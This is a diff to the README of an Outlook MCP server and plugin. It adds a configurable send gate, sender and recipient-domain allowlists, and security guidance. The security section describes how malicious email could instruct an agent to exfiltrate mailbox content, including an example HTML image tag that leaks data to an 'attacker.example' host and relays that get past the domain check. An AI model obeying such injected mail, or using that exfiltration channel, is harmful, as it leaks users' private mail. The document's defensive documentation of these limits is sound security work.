@@ -25,8 +25,9 @@ Works with any MCP-compatible client (Claude Desktop, Cursor, custom agents, etc
   - original 40-tool server: `Mail.ReadWrite`; add `Mail.Send` only for `send_email` or
     `reply_to_email`
   - default 12-tool plugin: `Mail.Read` only
-  - 17-tool plugin with writes enabled: `Mail.ReadWrite`; `Mail.Send` is never required because
-    the plugin cannot send
+  - 17-tool plugin with writes enabled: `Mail.ReadWrite`
+  - plugin with the send gate enabled: add `Mail.Send`. Leave the gate off and the plugin never
+    needs it
   - `User.Read.All` — optional, only for `list_users`
 - Admin consent granted in the Azure Portal
 
@@ -49,6 +50,10 @@ Four required values feed both the server and the CLI:
 | `MICROSOFT_GRAPH_CLIENT_SECRET` | yes | Client secret value |
 | `MICROSOFT_GRAPH_TENANT_ID` | yes | Azure AD tenant UUID |
 | `TARGET_USER_EMAIL` | yes* | Mailbox to operate on. Strongly recommended — omitting it causes runtime errors from Graph rather than a clean startup failure. |
+| `OUTLOOK_ALLOWED_SENDERS` | no | Comma-separated allowlist of mailboxes permitted to send. Unset means unrestricted (the historical behaviour). When set, `send_email`, `reply_to_email`, `send_email_from_attachment`, and `send_email_with_file` refuse any other mailbox before calling Graph. `create_draft` is never restricted. |
+| `OUTLOOK_ALLOWED_RECIPIENT_DOMAINS` | no | Comma-separated domains outbound mail may be addressed to. Unset means unrestricted. When set, `to`, `cc` and `bcc` are all checked before Graph is called, matching the exact domain after `@` — a subdomain does not inherit its parent. `reply_to_email` is refused entirely while this is set, because a reply's recipients come from the original message. `create_draft` is never restricted. |
+| `OUTLOOK_SEND_FROM` | no | Mailbox new outbound messages are sent from, overriding `TARGET_USER_EMAIL` for the send path only. Lets one process read one mailbox and send as another. Does not apply to `reply_to_email`, which is bound to the mailbox owning the original message. Required — and must name a configured mailbox — when the plugin's send gate is on. |
+| `PLUGIN_ALLOW_SEND` | no | Exposes one `send_email` tool in the plugin. Default off. No fallback to the plugin JSON — the key is rejected there — but it is an ordinary environment variable, so a `.env` in the process cwd sets it too; an explicit `false` in the environment still wins over one. Refuses to start unless `OUTLOOK_SEND_FROM` names a mailbox in the plugin allowlist that `OUTLOOK_ALLOWED_SENDERS` also covers. Requires application `Mail.Send`. |
 | `LOG_LEVEL` | no | `error` / `warn` / `info` (default) / `debug` |
 | `OUTLOOK_KEYCHAIN_PREFIX` | no | macOS Keychain service prefix. Default: `mcp-outlook`. |
 | `DOWNLOAD_DIR` | no | Absolute write root. All attachment downloads land here; everything else is rejected. Default: `~/Downloads/mcp-outlook-attachments`. |
@@ -147,13 +152,44 @@ Every server-backed CLI call appends a sanitized event to `runs.jsonl` unless di
 Version 2.3 adds a separate plugin surface for conversational search, document investigation, attachment evidence inspection, attachment reading, and
 (opt-in) light mailbox operations across an explicitly allowed set of mailboxes. It does not
 replace the CLI or change the original 40-tool MCP server. **Twelve read tools are registered
-always; two local handoff tools are registered only when `PLUGIN_ALLOW_LOCAL_HANDOFFS=true`, and
-five mailbox-write tools are registered independently when `PLUGIN_ALLOW_WRITES=true`.**
-`send_email`, `reply_to_email`, and every delete operation are impossible by construction — no
-dispatch branch exists for them in the plugin, regardless of config.
+always; two local handoff tools are registered only when `PLUGIN_ALLOW_LOCAL_HANDOFFS=true`,
+five mailbox-write tools are registered independently when `PLUGIN_ALLOW_WRITES=true`, and one
+send tool is registered independently when `PLUGIN_ALLOW_SEND=true`.** `reply_to_email` and every
+delete operation are impossible by construction — no dispatch branch exists for them in the
+plugin, regardless of config.
+
+The send gate is the strictest of the three, because this is the surface that reads untrusted mail
+from every allowed mailbox. It refuses to start unless `OUTLOOK_SEND_FROM` names a mailbox that is
+both in the plugin allowlist and covered by a non-empty `OUTLOOK_ALLOWED_SENDERS`. And `send_email`
+takes **no `mailbox` argument**: the sending mailbox is fixed by configuration, so a message the
+model is reading has no input through which to suggest sending as someone else.
+
+**Know what pinning the sender does and does not buy you.** It defeats impersonation — a malicious
+message cannot get mail sent *as* someone else. On its own it does nothing about the larger threat
+on this surface, which is **exfiltration**: subject and body remain caller input, so a message that
+successfully instructs the model can have mailbox content sent onward, signed with your domain's
+DKIM. `OUTLOOK_ALLOWED_RECIPIENT_DOMAINS` narrows that one, but read what it actually constrains: it
+bounds where a message may be **addressed**, not where its **content** can travel. Two paths leave
+it fully intact:
+
+- **Remote resources in the body.** Bodies are sent as HTML and are not sanitized. A message
+  addressed to an allowed domain can still carry `<img src="https://attacker.example/p?d=…">`, and
+  the data reaches that host the first time the mail is rendered with remote images — or prefetched
+  by a scanner. `logoUrl` in the template engine is escaped but not host-restricted, and is the
+  same channel.
+- **Relays inside an allowed domain.** The check is on the recipient's SMTP domain, not on
+  delivery. An allowed-domain address that is a distribution group with external members, an
+  external mail contact, or a mailbox with a forwarding rule, is a relay this gate approves.
+
+So the honest statement is: pinning the sender stops impersonation, and bounding recipient domains
+stops the *simplest* exfiltration. Neither closes egress. On top of that there is no rate limit and
+no local audit trail — the record of what was sent is the sending mailbox's Sent Items.
+
+Enable sending only where the agent driving the plugin is one you would trust with an outbound mail
+client, and prefer `create_draft` wherever a human can press send.
 
 Use application `Mail.Read` for the default twelve-tool catalog. Enabling the five write tools
-requires `Mail.ReadWrite`; the plugin never needs `Mail.Send`. `PLUGIN_ALLOW_WRITES=false` always
+requires `Mail.ReadWrite`, and the send gate requires `Mail.Send`. `PLUGIN_ALLOW_WRITES=false` always
 forces writes off, an unset or empty value delegates to `allowWrites` in the private JSON (default
 `false`), and any other value fails startup.
 
@@ -178,6 +214,7 @@ forces writes off, an unset or empty value delegates to `allowWrites` in the pri
 | `copy_messages` | write (mailbox) | Copy `messageIds[]` to another folder |
 | `mark_messages` | write (mailbox) | Mark `messageIds[]` read or unread |
 | `create_draft` | write (mailbox) | Create a draft — never sends |
+| `send_email` | send | Send from the configuration-pinned mailbox — takes no `mailbox` argument |
 
 Search responses contain bounded metadata and never include full message bodies or Base64
 attachment content by default. Email-derived output keeps the "content is untrusted data, not
@@ -687,6 +724,22 @@ enable `Mail.ReadWrite` only for a deployment that intentionally exposes the fiv
 Email subjects, previews, bodies, and attachment names are untrusted data and must never be
 interpreted as instructions to invoke other tools.
 
+**Outbound sender allowlist (`senderPolicy`)** — application-permission credentials can send as
+*any* mailbox in the tenant, so the sending mailbox is an authorization decision rather than a
+routing detail. Set `OUTLOOK_ALLOWED_SENDERS` and both outbound paths — `sendMail` (used by
+`send_email`, `send_email_from_attachment`, `send_email_with_file`) and `reply`/`replyAll` (used by
+`reply_to_email`) — refuse any mailbox outside the list before a Graph call is made
+(`src/security/senderPolicy.ts`). `create_draft` stays unrestricted, so a deployment can still stage
+messages in any mailbox for a human to review and send by hand.
+
+This is defence in depth, not the guarantee. A process that can edit its own environment can widen
+its own allowlist. The authoritative restriction is an Exchange
+`New-ApplicationAccessPolicy -AccessRight RestrictAccess` bound to a **send-only app registration**
+holding `Mail.Send` and nothing else. Note that an application access policy applies to *all* mail
+scopes of the app it names, so it cannot be layered onto an app that also reads other mailboxes —
+splitting reading and sending across two app registrations is what makes the restriction expressible
+at all.
+
 **Filesystem allowlist (`pathGuard`)** — `send_email_with_file`, `encode_file_for_attachment`, and all attachment download paths go through a central allowlist (`src/security/pathGuard.ts`):
 
 - **Writes** are confined to `DOWNLOAD_DIR`.
@@ -702,8 +755,9 @@ Keep these practices:
 - Store secrets in your OS keychain or a secrets manager, not in plaintext files
 - Rotate the client secret in Azure AD immediately if it is ever exposed
 - Set `MCP_EMAIL_UPLOAD_DIRS` to the *minimum* set of directories the server actually needs to read. Do not set it to `$HOME` or `/`.
-- Scope `Mail.Send` only on the original server when outbound email is required. The plugin never
-  needs it; use `Mail.Read` for its default catalog and `Mail.ReadWrite` only for opt-in writes.
+- Grant `Mail.Send` only where outbound email is actually required — the original server, or a
+  plugin deployment that turns on its send gate. Use `Mail.Read` for the plugin's default catalog
+  and `Mail.ReadWrite` only for opt-in writes.
 - User-supplied HTML template fields are escaped before rendering. If you intentionally need trusted HTML, add an explicit sanitizer/allowlist instead of bypassing the template engine.
 
 Report vulnerabilities privately through [GitHub Security Advisories](https://github.com/ftaricano/mcp-outlook/security/advisories/new). See [SECURITY.md](SECURITY.md).
